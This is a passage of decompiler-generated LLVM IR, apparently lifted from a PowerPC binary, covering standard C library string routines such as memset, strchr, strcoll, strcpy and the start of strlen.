  store i8 %v3_1001bc9c10, i8* %v4_1001bca013, align 1
  store i32 %v3_1001bca012, i32* %r9.global-to-local, align 4
  %v0_1001bca414 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bca415 = add i32 %v0_1001bca414, -1
  store i32 %v1_1001bca415, i32* %ctr.global-to-local, align 4
  %v2_1001bca416 = icmp eq i32 %v1_1001bca415, 0
  br i1 %v2_1001bca416, label %dec_label_pc_1001bcd8, label %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge

dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge: ; preds = %dec_label_pc_1001bc88, %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge
  %v3_1001bca017 = phi i32 [ %v3_1001bca0, %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge ], [ %v3_1001bca012, %dec_label_pc_1001bc88 ]
  %v0_1001bc9c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bc9c = add i32 %v0_1001bc9c.pre, 1
  %v2_1001bc9c = inttoptr i32 %v1_1001bc9c to i8*
  %v3_1001bc9c = load i8, i8* %v2_1001bc9c, align 1
  store i32 %v1_1001bc9c, i32* %r4.global-to-local, align 4
  %v3_1001bca0 = add i32 %v3_1001bca017, 1
  %v4_1001bca0 = inttoptr i32 %v3_1001bca0 to i8*
  store i8 %v3_1001bc9c, i8* %v4_1001bca0, align 1
  store i32 %v3_1001bca0, i32* %r9.global-to-local, align 4
  %v0_1001bca4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bca4 = add i32 %v0_1001bca4, -1
  store i32 %v1_1001bca4, i32* %ctr.global-to-local, align 4
  %v2_1001bca4 = icmp eq i32 %v1_1001bca4, 0
  br i1 %v2_1001bca4, label %dec_label_pc_1001bcd8, label %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge

dec_label_pc_1001bcac:                            ; preds = %dec_label_pc_1001bc50
  %v1_1001bcac = sub nsw i32 4, %v1_1001bc50
  store i32 %v1_1001bcac, i32* %ctr.global-to-local, align 4
  %v1_1001bcb4 = load i32, i32* @r5, align 4
  %v2_1001bcb4 = sub i32 %v1_1001bcb4, %v1_1001bcac
  br label %dec_label_pc_1001bcb8

dec_label_pc_1001bcb8:                            ; preds = %dec_label_pc_1001bcb8, %dec_label_pc_1001bcac
  %v2_1001bcc0 = phi i32 [ %v1_1001bcc4, %dec_label_pc_1001bcb8 ], [ %v0_1001bc50, %dec_label_pc_1001bcac ]
  %v0_1001bcb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001bcb8 = add i32 %v0_1001bcb8, 4
  %v2_1001bcb8 = inttoptr i32 %v1_1001bcb8 to i8*
  %v3_1001bcb8 = load i8, i8* %v2_1001bcb8, align 1
  %v1_1001bcbc = add i32 %v0_1001bcb8, 1
  store i32 %v1_1001bcbc, i32* %r4.global-to-local, align 4
  %v3_1001bcc0 = add i32 %v2_1001bcc0, 4
  %v4_1001bcc0 = inttoptr i32 %v3_1001bcc0 to i8*
  store i8 %v3_1001bcb8, i8* %v4_1001bcc0, align 1
  %v0_1001bcc4 = load i32, i32* @r11, align 4
  %v1_1001bcc4 = add i32 %v0_1001bcc4, 1
  store i32 %v1_1001bcc4, i32* @r11, align 4
  %v0_1001bcc8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bcc8 = add i32 %v0_1001bcc8, -1
  store i32 %v1_1001bcc8, i32* %ctr.global-to-local, align 4
  %v2_1001bcc8 = icmp eq i32 %v1_1001bcc8, 0
  br i1 %v2_1001bcc8, label %dec_label_pc_1001bccc, label %dec_label_pc_1001bcb8

dec_label_pc_1001bccc:                            ; preds = %dec_label_pc_1001bcb8
  %v1_1001bccc = call i32 @__asm_rlwinm.(i32 %v2_1001bcb4, i32 29, i32 3, i32 31)
  store i32 %v1_1001bccc, i32* %r9.global-to-local, align 4
  %v4_1001bccc = icmp eq i32 %v1_1001bccc, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1001bccc, label %dec_label_pc_1001bc70, label %dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge

dec_label_pc_1001bccc.dec_label_pc_1001bc58_crit_edge: ; preds = %dec_label_pc_1001bccc
  %v1_1001bc64.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001bc58

dec_label_pc_1001bcd8:                            ; preds = %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge, %dec_label_pc_1001bc88
  %v0_1001bcd8 = load i32, i32* @r3, align 4
  ret i32 %v0_1001bcd8

; uselistorder directives
  uselistorder i32 %v1_1001bccc, { 1, 2, 0 }
  uselistorder i32 %v1_1001bcc8, { 1, 0 }
  uselistorder i32 %v1_1001bcc4, { 1, 0 }
  uselistorder i32 %v2_1001bcb4, { 2, 1, 0 }
  uselistorder i32 %v1_1001bca4, { 1, 0 }
  uselistorder i32 %v3_1001bca0, { 1, 2, 0 }
  uselistorder i32 %v1_1001bc70, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1001bc6c, { 1, 0 }
  uselistorder i32 %v2_1001bc68, { 1, 2, 0 }
  uselistorder i32 %v1_1001bc50, { 1, 0 }
  uselistorder i32 %v0_1001bc50, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 7, 3, 2, 0, 4, 8, 5, 10, 6, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1001bc9c.dec_label_pc_1001bc9c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001bc88, { 1, 0 }
  uselistorder label %dec_label_pc_1001bc70, { 1, 0, 2 }
}

define i32 @__GI_memset() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001bcdc = load i32, i32* @r4, align 4
  %v0_1001bce0 = load i32, i32* @r3, align 4
  %v1_1001bce0 = add i32 %v0_1001bce0, -4
  store i32 %v1_1001bce0, i32* %r11.global-to-local, align 4
  %v1_1001bce4 = call i32 @__asm_rlwimi(i32 %v0_1001bcdc, i32 8, i32 16, i32 23)
  %v1_1001bce8 = call i32 @__asm_rlwimi(i32 %v1_1001bce4, i32 16, i32 0, i32 15)
  %v2_1001bce8 = trunc i32 %v1_1001bce8 to i8
  store i32 %v1_1001bce8, i32* @r10, align 4
  %v0_1001bcec = load i32, i32* @r5, align 4
  %v1_1001bcec = call i32 @__asm_rlwinm.(i32 %v0_1001bcec, i32 29, i32 3, i32 31)
  store i32 %v1_1001bcec, i32* %r9.global-to-local, align 4
  %v4_1001bcec = icmp eq i32 %v1_1001bcec, 0
  br i1 %v4_1001bcec, label %dec_label_pc_1001bd14, label %dec_label_pc_1001bcf4

dec_label_pc_1001bcf4:                            ; preds = %entry
  %v0_1001bcf4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bcf4 = urem i32 %v0_1001bcf4, 4
  %v3_1001bcf4 = icmp eq i32 %v1_1001bcf4, 0
  br i1 %v3_1001bcf4, label %dec_label_pc_1001bcfc, label %dec_label_pc_1001bd44

dec_label_pc_1001bcfc:                            ; preds = %dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge, %dec_label_pc_1001bcf4
  %v0_1001bd00.pre = phi i32 [ %v0_1001bcf4, %dec_label_pc_1001bcf4 ], [ %v0_1001bd00.pre.pre, %dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge ]
  %v0_1001bcfc = phi i32 [ %v1_1001bcec, %dec_label_pc_1001bcf4 ], [ %v1_1001bd5c, %dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1001bcf4 ], [ %v2_1001bd4c, %dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge ]
  store i32 %v0_1001bcfc, i32* %ctr.global-to-local, align 4
  %v1_1001bd04 = sext i8 %v2_1001bce8 to i32
  br label %dec_label_pc_1001bd00

dec_label_pc_1001bd00:                            ; preds = %dec_label_pc_1001bd00, %dec_label_pc_1001bcfc
  %v0_1001bd00 = phi i32 [ %v1_1001bd0c, %dec_label_pc_1001bd00 ], [ %v0_1001bd00.pre, %dec_label_pc_1001bcfc ]
  %v1_1001bd00 = add i32 %v0_1001bd00, 4
  store i32 %v1_1001bd00, i32* %r9.global-to-local, align 4
  %v4_1001bd04 = inttoptr i32 %v1_1001bd00 to i32*
  store i32 %v1_1001bd04, i32* %v4_1001bd04, align 4
  %v2_1001bd08 = load i32, i32* %r9.global-to-local, align 4
  %v3_1001bd08 = add i32 %v2_1001bd08, 4
  %v4_1001bd08 = inttoptr i32 %v3_1001bd08 to i32*
  store i32 %v1_1001bd04, i32* %v4_1001bd08, align 4
  %v0_1001bd0c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bd0c = add i32 %v0_1001bd0c, 4
  store i32 %v1_1001bd0c, i32* %r11.global-to-local, align 4
  %v0_1001bd10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd10 = add i32 %v0_1001bd10, -1
  store i32 %v1_1001bd10, i32* %ctr.global-to-local, align 4
  %v2_1001bd10 = icmp eq i32 %v1_1001bd10, 0
  br i1 %v2_1001bd10, label %dec_label_pc_1001bd14, label %dec_label_pc_1001bd00

dec_label_pc_1001bd14:                            ; preds = %dec_label_pc_1001bd00, %dec_label_pc_1001bd5c, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1001bd4c, %dec_label_pc_1001bd5c ], [ %.0, %dec_label_pc_1001bd00 ]
  %v1_1001bd14 = urem i32 %.1, 8
  store i32 %v1_1001bd14, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1001bd14, 4
  br i1 %tmp, label %dec_label_pc_1001bd28, label %dec_label_pc_1001bd20

dec_label_pc_1001bd20:                            ; preds = %dec_label_pc_1001bd14
  %v1_1001bd20 = sext i8 %v2_1001bce8 to i32
  %v2_1001bd20 = load i32, i32* %r11.global-to-local, align 4
  %v3_1001bd20 = add i32 %v2_1001bd20, 4
  %v4_1001bd20 = inttoptr i32 %v3_1001bd20 to i32*
  store i32 %v1_1001bd20, i32* %v4_1001bd20, align 4
  store i32 %v3_1001bd20, i32* %r11.global-to-local, align 4
  %v0_1001bd24 = load i32, i32* @r5, align 4
  %v1_1001bd24 = add i32 %v0_1001bd24, -4
  store i32 %v1_1001bd24, i32* @r5, align 4
  br label %dec_label_pc_1001bd28

dec_label_pc_1001bd28:                            ; preds = %dec_label_pc_1001bd14, %dec_label_pc_1001bd20
  %v0_1001bd28 = phi i32 [ %v1_1001bd14, %dec_label_pc_1001bd14 ], [ %v1_1001bd24, %dec_label_pc_1001bd20 ]
  %v3_1001bd28 = icmp eq i32 %v0_1001bd28, 0
  %v0_1001bd2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001bd28, i32 %v0_1001bd2c)
  %v0_1001bd30 = load i32, i32* @r5, align 4
  store i32 %v0_1001bd30, i32* %ctr.global-to-local, align 4
  %v0_1001bd34 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bd34 = add i32 %v0_1001bd34, 3
  store i32 %v1_1001bd34, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001bd38

dec_label_pc_1001bd38:                            ; preds = %dec_label_pc_1001bd38, %dec_label_pc_1001bd28
  %v3_1001bd38 = phi i32 [ %v4_1001bd38, %dec_label_pc_1001bd38 ], [ %v1_1001bd34, %dec_label_pc_1001bd28 ]
  %v4_1001bd38 = add i32 %v3_1001bd38, 1
  %v5_1001bd38 = inttoptr i32 %v4_1001bd38 to i8*
  store i8 %v2_1001bce8, i8* %v5_1001bd38, align 1
  store i32 %v4_1001bd38, i32* %r9.global-to-local, align 4
  %v0_1001bd3c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd3c = add i32 %v0_1001bd3c, -1
  store i32 %v1_1001bd3c, i32* %ctr.global-to-local, align 4
  %v2_1001bd3c = icmp eq i32 %v1_1001bd3c, 0
  br i1 %v2_1001bd3c, label %dec_label_pc_1001bd68, label %dec_label_pc_1001bd38

dec_label_pc_1001bd44:                            ; preds = %dec_label_pc_1001bcf4
  %v1_1001bd44 = sub nsw i32 4, %v1_1001bcf4
  store i32 %v1_1001bd44, i32* %ctr.global-to-local, align 4
  %v1_1001bd4c = load i32, i32* @r5, align 4
  %v2_1001bd4c = sub i32 %v1_1001bd4c, %v1_1001bd44
  br label %dec_label_pc_1001bd50

dec_label_pc_1001bd50:                            ; preds = %dec_label_pc_1001bd50, %dec_label_pc_1001bd44
  %v3_1001bd50 = phi i32 [ %v1_1001bd54, %dec_label_pc_1001bd50 ], [ %v0_1001bcf4, %dec_label_pc_1001bd44 ]
  %v4_1001bd50 = add i32 %v3_1001bd50, 4
  %v5_1001bd50 = inttoptr i32 %v4_1001bd50 to i8*
  store i8 %v2_1001bce8, i8* %v5_1001bd50, align 1
  %v0_1001bd54 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001bd54 = add i32 %v0_1001bd54, 1
  store i32 %v1_1001bd54, i32* %r11.global-to-local, align 4
  %v0_1001bd58 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001bd58 = add i32 %v0_1001bd58, -1
  store i32 %v1_1001bd58, i32* %ctr.global-to-local, align 4
  %v2_1001bd58 = icmp eq i32 %v1_1001bd58, 0
  br i1 %v2_1001bd58, label %dec_label_pc_1001bd5c, label %dec_label_pc_1001bd50

dec_label_pc_1001bd5c:                            ; preds = %dec_label_pc_1001bd50
  %v1_1001bd5c = call i32 @__asm_rlwinm.(i32 %v2_1001bd4c, i32 29, i32 3, i32 31)
  store i32 %v1_1001bd5c, i32* %r9.global-to-local, align 4
  %v4_1001bd5c = icmp eq i32 %v1_1001bd5c, 0
  br i1 %v4_1001bd5c, label %dec_label_pc_1001bd14, label %dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge

dec_label_pc_1001bd5c.dec_label_pc_1001bcfc_crit_edge: ; preds = %dec_label_pc_1001bd5c
  %v0_1001bd00.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001bcfc

dec_label_pc_1001bd68:                            ; preds = %dec_label_pc_1001bd38
  %v0_1001bd68 = load i32, i32* @r3, align 4
  ret i32 %v0_1001bd68

; uselistorder directives
  uselistorder i32 %v1_1001bd5c, { 1, 2, 0 }
  uselistorder i32 %v1_1001bd58, { 1, 0 }
  uselistorder i32 %v1_1001bd54, { 1, 0 }
  uselistorder i32 %v2_1001bd4c, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd3c, { 1, 0 }
  uselistorder i32 %v4_1001bd38, { 1, 2, 0 }
  uselistorder i32 %v1_1001bd14, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd10, { 1, 0 }
  uselistorder i32 %v1_1001bd0c, { 1, 0 }
  uselistorder i32 %v1_1001bcf4, { 1, 0 }
  uselistorder i32 %v0_1001bcf4, { 2, 1, 0 }
  uselistorder i8 %v2_1001bce8, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1001bce8, { 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 27, 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_1001bd28, { 1, 0 }
  uselistorder label %dec_label_pc_1001bd14, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1001bd6c = urem i32 %arg1, 256
  store i32 %v1_1001bd6c, i32* %r4.global-to-local, align 4
  %v0_1001bd8c2 = load i32, i32* @r3, align 4
  %v1_1001bd8c3 = urem i32 %v0_1001bd8c2, 4
  %v3_1001bd8c5 = icmp eq i32 %v1_1001bd8c3, 0
  br i1 %v3_1001bd8c5, label %dec_label_pc_1001bd94, label %dec_label_pc_1001bd74

dec_label_pc_1001bd74:                            ; preds = %entry, %dec_label_pc_1001bd88
  %v1_1001bd78 = phi i32 [ %v0_1001bd94.pre, %dec_label_pc_1001bd88 ], [ %v1_1001bd6c, %entry ]
  %v0_1001bd74 = phi i32 [ %v1_1001bd88, %dec_label_pc_1001bd88 ], [ %v0_1001bd8c2, %entry ]
  %v1_1001bd74 = inttoptr i32 %v0_1001bd74 to i8*
  %v2_1001bd74 = load i8, i8* %v1_1001bd74, align 1
  %v3_1001bd74 = zext i8 %v2_1001bd74 to i32
  %v4_1001bd78 = icmp eq i32 %v3_1001bd74, %v1_1001bd78
  %v3_1001bd7c = icmp eq i8 %v2_1001bd74, 0
  %v0_1001bd80 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001bd78, i32 %v0_1001bd80)
  br i1 %v3_1001bd7c, label %dec_label_pc_1001be64, label %dec_label_pc_1001bd88

dec_label_pc_1001bd88:                            ; preds = %dec_label_pc_1001bd74
  %v0_1001bd88 = load i32, i32* @r3, align 4
  %v1_1001bd88 = add i32 %v0_1001bd88, 1
  store i32 %v1_1001bd88, i32* @r3, align 4
  %v1_1001bd8c = urem i32 %v1_1001bd88, 4
  %v3_1001bd8c = icmp eq i32 %v1_1001bd8c, 0
  %v0_1001bd94.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1001bd8c, label %dec_label_pc_1001bd94, label %dec_label_pc_1001bd74

dec_label_pc_1001bd94:                            ; preds = %dec_label_pc_1001bd88, %entry
  %v0_1001bdac10 = phi i32 [ %v0_1001bd8c2, %entry ], [ %v1_1001bd88, %dec_label_pc_1001bd88 ]
  %v0_1001bd94 = phi i32 [ %v1_1001bd6c, %entry ], [ %v0_1001bd94.pre, %dec_label_pc_1001bd88 ]
  %v1_1001bd94 = mul i32 %v0_1001bd94, 256
  %v2_1001bd9c = or i32 %v1_1001bd94, %v0_1001bd94
  %v1_1001bda4 = mul i32 %v2_1001bd9c, 65536
  %v2_1001bda8 = or i32 %v1_1001bda4, %v2_1001bd9c
  br label %dec_label_pc_1001bdac

dec_label_pc_1001bdac:                            ; preds = %dec_label_pc_1001bdac, %dec_label_pc_1001be60, %dec_label_pc_1001bd94
  %v0_1001be04 = phi i32 [ %v0_1001bdac10, %dec_label_pc_1001bd94 ], [ %v1_1001bdb0, %dec_label_pc_1001be60 ], [ %v1_1001bdb0, %dec_label_pc_1001bdac ]
  %v1_1001bdac = inttoptr i32 %v0_1001be04 to i32*
  %v2_1001bdac = load i32, i32* %v1_1001bdac, align 4
  %v1_1001bdb0 = add i32 %v0_1001be04, 4
  %v2_1001bdb8 = xor i32 %v2_1001bdac, %v2_1001bda8
  %v1_1001bdc4 = add i32 %v2_1001bdac, 2130640639
  %v1_1001bdc8 = add i32 %v2_1001bdb8, 2130640639
  %v2_1001bdcc = xor i32 %v1_1001bdc4, %v2_1001bdac
  store i32 %v2_1001bdcc, i32* @r8, align 4
  %v2_1001bdd0 = xor i32 %v1_1001bdc8, %v2_1001bdb8
  %v2_1001bdd4 = and i32 %v2_1001bdcc, -2130640640
  %v3_1001bdd4 = xor i32 %v2_1001bdd4, -2130640640
  %v2_1001bdd8 = and i32 %v2_1001bdd0, -2130640640
  %v3_1001bdd8 = xor i32 %v2_1001bdd8, -2130640640
  %tmp = or i32 %v3_1001bdd8, %v3_1001bdd4
  %tmp16 = icmp eq i32 %tmp, 0
  br i1 %tmp16, label %dec_label_pc_1001bdac, label %dec_label_pc_1001bde8

dec_label_pc_1001bde8:                            ; preds = %dec_label_pc_1001bdac
  %v2_1001bde8 = inttoptr i32 %v0_1001be04 to i8*
  %v3_1001bde8 = load i8, i8* %v2_1001bde8, align 1
  %v4_1001bde8 = zext i8 %v3_1001bde8 to i32
  %v1_1001bdec = add i32 %v0_1001be04, 1
  %v1_1001bdf0 = add i32 %v0_1001be04, 2
  store i32 %v1_1001bdf0, i32* @r11, align 4
  %v1_1001bdf4 = add i32 %v0_1001be04, 3
  store i32 %v1_1001bdf4, i32* @r10, align 4
  %v4_1001bdf8 = icmp eq i32 %v4_1001bde8, %v0_1001bd94
  br i1 %v4_1001bdf8, label %dec_label_pc_1001be04, label %dec_label_pc_1001be0c

dec_label_pc_1001be04:                            ; preds = %dec_label_pc_1001bde8
  ret i32 %v0_1001be04

dec_label_pc_1001be0c:                            ; preds = %dec_label_pc_1001bde8
  %v3_1001bdfc = icmp eq i8 %v3_1001bde8, 0
  br i1 %v3_1001bdfc, label %dec_label_pc_1001be64, label %dec_label_pc_1001be10

dec_label_pc_1001be10:                            ; preds = %dec_label_pc_1001be0c
  %v2_1001be10 = inttoptr i32 %v1_1001bdec to i8*
  %v3_1001be10 = load i8, i8* %v2_1001be10, align 1
  %v4_1001be10 = zext i8 %v3_1001be10 to i32
  %v4_1001be14 = icmp eq i32 %v4_1001be10, %v0_1001bd94
  br i1 %v4_1001be14, label %dec_label_pc_1001be20, label %dec_label_pc_1001be28

dec_label_pc_1001be20:                            ; preds = %dec_label_pc_1001be10
  ret i32 %v1_1001bdec

dec_label_pc_1001be28:                            ; preds = %dec_label_pc_1001be10
  %v3_1001be18 = icmp eq i8 %v3_1001be10, 0
  br i1 %v3_1001be18, label %dec_label_pc_1001be64, label %dec_label_pc_1001be2c

dec_label_pc_1001be2c:                            ; preds = %dec_label_pc_1001be28
  %v2_1001be2c = inttoptr i32 %v1_1001bdf0 to i8*
  %v3_1001be2c = load i8, i8* %v2_1001be2c, align 1
  %v4_1001be2c = zext i8 %v3_1001be2c to i32
  %v4_1001be30 = icmp eq i32 %v4_1001be2c, %v0_1001bd94
  br i1 %v4_1001be30, label %dec_label_pc_1001be3c, label %dec_label_pc_1001be44

dec_label_pc_1001be3c:                            ; preds = %dec_label_pc_1001be2c
  ret i32 %v1_1001bdf0

dec_label_pc_1001be44:                            ; preds = %dec_label_pc_1001be2c
  %v3_1001be34 = icmp eq i8 %v3_1001be2c, 0
  br i1 %v3_1001be34, label %dec_label_pc_1001be64, label %dec_label_pc_1001be48

dec_label_pc_1001be48:                            ; preds = %dec_label_pc_1001be44
  %v2_1001be48 = inttoptr i32 %v1_1001bdf4 to i8*
  %v3_1001be48 = load i8, i8* %v2_1001be48, align 1
  %v4_1001be48 = zext i8 %v3_1001be48 to i32
  %v4_1001be4c = icmp eq i32 %v4_1001be48, %v0_1001bd94
  br i1 %v4_1001be4c, label %dec_label_pc_1001be58, label %dec_label_pc_1001be60

dec_label_pc_1001be58:                            ; preds = %dec_label_pc_1001be48
  ret i32 %v1_1001bdf4

dec_label_pc_1001be60:                            ; preds = %dec_label_pc_1001be48
  %v3_1001be50 = icmp eq i8 %v3_1001be48, 0
  br i1 %v3_1001be50, label %dec_label_pc_1001be64, label %dec_label_pc_1001bdac

dec_label_pc_1001be64:                            ; preds = %dec_label_pc_1001bd74, %dec_label_pc_1001be60, %dec_label_pc_1001be44, %dec_label_pc_1001be28, %dec_label_pc_1001be0c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1001bdb0, { 1, 0 }
  uselistorder i32 %v2_1001bdac, { 0, 2, 1 }
  uselistorder i32 %v0_1001be04, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1001bd9c, { 1, 0 }
  uselistorder i32 %v0_1001bd94, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1001bd88, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1001bd8c2, { 2, 1, 0 }
  uselistorder i32 %v1_1001bd6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001be64, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1001bdac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001bd74, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001be78.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001be70

dec_label_pc_1001be70:                            ; preds = %dec_label_pc_1001be94, %entry
  %v0_1001be78 = phi i32 [ %v1_1001be7c, %dec_label_pc_1001be94 ], [ %v0_1001be78.pre, %entry ]
  %v0_1001be70 = phi i32 [ %v1_1001be74, %dec_label_pc_1001be94 ], [ %tmp, %entry ]
  %v1_1001be70 = inttoptr i32 %v0_1001be70 to i8*
  %v2_1001be70 = load i8, i8* %v1_1001be70, align 1
  %v3_1001be70 = zext i8 %v2_1001be70 to i32
  %v1_1001be78 = inttoptr i32 %v0_1001be78 to i8*
  %v2_1001be78 = load i8, i8* %v1_1001be78, align 1
  %v3_1001be78 = zext i8 %v2_1001be78 to i32
  %v3_1001be80 = icmp eq i8 %v2_1001be70, 0
  br i1 %v3_1001be80, label %dec_label_pc_1001be8c, label %dec_label_pc_1001be94

dec_label_pc_1001be8c:                            ; preds = %dec_label_pc_1001be70
  %v1_1001be8c = sub nsw i32 0, %v3_1001be78
  ret i32 %v1_1001be8c

dec_label_pc_1001be94:                            ; preds = %dec_label_pc_1001be70
  %v4_1001be84 = icmp eq i8 %v2_1001be70, %v2_1001be78
  %v1_1001be7c = add i32 %v0_1001be78, 1
  %v1_1001be74 = add i32 %v0_1001be70, 1
  br i1 %v4_1001be84, label %dec_label_pc_1001be70, label %dec_label_pc_1001be98

dec_label_pc_1001be98:                            ; preds = %dec_label_pc_1001be94
  %v2_1001be98 = sub nsw i32 %v3_1001be70, %v3_1001be78
  ret i32 %v2_1001be98

; uselistorder directives
  uselistorder i32 %v3_1001be78, { 1, 0 }
  uselistorder i32 %v0_1001be70, { 1, 0 }
  uselistorder i32 %v0_1001be78, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1001bea0 = add i32 %arg1, -1
  %v1_1001bea4 = sub i32 %v2_1001bea0, %tmp
  store i32 %v1_1001bea4, i32* %r9.global-to-local, align 4
  %v2_1001bea84 = load i8, i8* %arg2, align 1
  %v1_1001beac6 = add i32 %tmp, 1
  store i32 %v1_1001beac6, i32* %r4.global-to-local, align 4
  %v3_1001beb08 = icmp eq i8 %v2_1001bea84, 0
  store i1 %v3_1001beb08, i1* %cr7_eq.global-to-local, align 1
  %v5_1001beb49 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1001bea84, i8* %v5_1001beb49, align 1
  %v0_1001beb810 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001beb810, label %dec_label_pc_1001bebc, label %dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge

dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge: ; preds = %entry, %dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge
  %v0_1001bea8.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1001beb4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001bea8 = inttoptr i32 %v0_1001bea8.pre to i8*
  %v2_1001bea8 = load i8, i8* %v1_1001bea8, align 1
  %v1_1001beac = add i32 %v0_1001bea8.pre, 1
  store i32 %v1_1001beac, i32* %r4.global-to-local, align 4
  %v3_1001beb0 = icmp eq i8 %v2_1001bea8, 0
  store i1 %v3_1001beb0, i1* %cr7_eq.global-to-local, align 1
  %v4_1001beb4 = add i32 %v1_1001beac, %v2_1001beb4.pre
  %v5_1001beb4 = inttoptr i32 %v4_1001beb4 to i8*
  store i8 %v2_1001bea8, i8* %v5_1001beb4, align 1
  %v0_1001beb8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001beb8, label %dec_label_pc_1001bebc, label %dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge

dec_label_pc_1001bebc:                            ; preds = %dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001bea8.dec_label_pc_1001bea8_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1001bec0 = load i32, i32* @r3, align 4
  store i32 %v0_1001bec0, i32* @r10, align 4
  %v1_1001bed83 = urem i32 %v0_1001bec0, 4
  %v3_1001bed85 = icmp eq i32 %v1_1001bed83, 0
  br i1 %v3_1001bed85, label %dec_label_pc_1001bee0, label %dec_label_pc_1001bec8

dec_label_pc_1001bec8:                            ; preds = %entry, %dec_label_pc_1001bed4
  %v0_1001bed4 = phi i32 [ %v1_1001bed4, %dec_label_pc_1001bed4 ], [ %v0_1001bec0, %entry ]
  %v1_1001bec8 = inttoptr i32 %v0_1001bed4 to i8*
  %v2_1001bec8 = load i8, i8* %v1_1001bec8, align 1
  %v3_1001becc = icmp eq i8 %v2_1001bec8, 0
  br i1 %v3_1001becc, label %dec_label_pc_1001bf14, label %dec_label_pc_1001bed4

dec_label_pc_1001bed4:                            ; preds = %dec_label_pc_1001bec8
  %v1_1001bed4 = add i32 %v0_1001bed4, 1
  %v1_1001bed8 = urem i32 %v1_1001bed4, 4
